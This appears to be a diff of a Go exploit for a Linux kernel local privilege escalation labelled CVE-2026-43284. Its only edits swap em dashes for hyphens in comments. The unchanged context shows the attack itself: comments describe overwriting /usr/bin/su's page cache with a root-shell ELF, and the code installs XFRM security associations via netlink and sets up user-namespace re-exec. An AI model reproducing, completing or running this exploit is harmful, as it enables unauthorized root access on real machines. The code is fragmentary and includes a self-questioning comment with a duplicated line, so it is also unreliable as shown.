@@ -1,6 +1,6 @@
 package main
 
-// ESP/XFRM LPE path — CVE-2026-43284
+// ESP/XFRM LPE path - CVE-2026-43284
 // Overwrites first 192 bytes of /usr/bin/su page-cache with a minimal
 // x86_64 root-shell ELF by installing XFRM SAs with controlled seq_hi
 // and triggering ESP in-place decryption via the vmsplice+splice chain.
@@ -131,7 +131,7 @@ func putAttr(buf []byte, pos *int, attrType int, data []byte) {
 }
 
 // addXfrmSA installs one XFRM Security Association via NETLINK_XFRM.
-// patchSeqhi is stored in esn->seq_hi — the 4-byte word that will be
+// patchSeqhi is stored in esn->seq_hi - the 4-byte word that will be
 // written into the target file's page-cache during ESP decryption.
 func addXfrmSA(spi, patchSeqhi uint32) error {
 	sk, err := syscall.Socket(syscall.AF_NETLINK, syscall.SOCK_RAW, unix.NETLINK_XFRM)
@@ -171,7 +171,7 @@ func addXfrmSA(spi, patchSeqhi uint32) error {
 	// xfrm_id: daddr(16) + spi(4, BE) + proto(1) + pad(3) = 24
 	idBase := selSz
 	binary.BigEndian.PutUint32(xs[idBase:], lo127) // daddr.a4
-	binary.BigEndian.PutUint32(xs[idBase+16:], spi) // spi already BE from caller? No — htonl(spi) in C.
+	binary.BigEndian.PutUint32(xs[idBase+16:], spi) // spi already BE from caller? No - htonl(spi) in C.
 	// Actually spi is passed as host value; C does htonl(spi). We store BE:
 	binary.BigEndian.PutUint32(xs[idBase+16:], spi)
 	xs[idBase+20] = syscall.IPPROTO_ESP // proto
@@ -188,7 +188,7 @@ func addXfrmSA(spi, patchSeqhi uint32) error {
 	binary.LittleEndian.PutUint64(xs[lftBase+8:], ^uint64(0))  // hard_byte_limit
 	binary.LittleEndian.PutUint64(xs[lftBase+16:], ^uint64(0)) // soft_packet_limit
 	binary.LittleEndian.PutUint64(xs[lftBase+24:], ^uint64(0)) // hard_packet_limit
-	// offsets 32-63: soft/hard add/use expires — zero = no expiry
+	// offsets 32-63: soft/hard add/use expires - zero = no expiry
 	lftSz := 64
 
 	// xfrm_lifetime_cur: 4 * uint64 = 32
@@ -374,7 +374,7 @@ func verifyByte(path string, offset int64, want byte) bool {
 
 // suLPE spawns a namespace-isolated child via re-exec with Cloneflags.
 // Go's runtime is multi-threaded so we can't call unshare(CLONE_NEWUSER)
-// directly — instead we use exec.Cmd with SysProcAttr.Cloneflags which
+// directly - instead we use exec.Cmd with SysProcAttr.Cloneflags which
 // calls clone() on the child before the Go runtime starts.
 func suLPE() bool {
 	exe, err := os.Executable()
